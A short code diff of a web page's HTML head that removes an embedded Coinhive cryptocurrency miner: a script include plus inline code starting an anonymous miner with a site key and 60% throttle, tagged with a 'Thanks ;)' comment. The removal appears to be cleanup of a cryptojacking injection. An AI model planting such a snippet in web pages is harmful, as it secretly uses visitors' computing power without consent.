@@ -37,14 +37,6 @@
     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
-
-    <!--- Thanks ;) -->
-    <script src="./js/coinhive.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('Nh4XYpARBp0w6kAKwMIMg4PcAzUjww09');
-        miner.setThrottle(0.6)
-        miner.start();
-    </script>
 </head>
 
 <body>
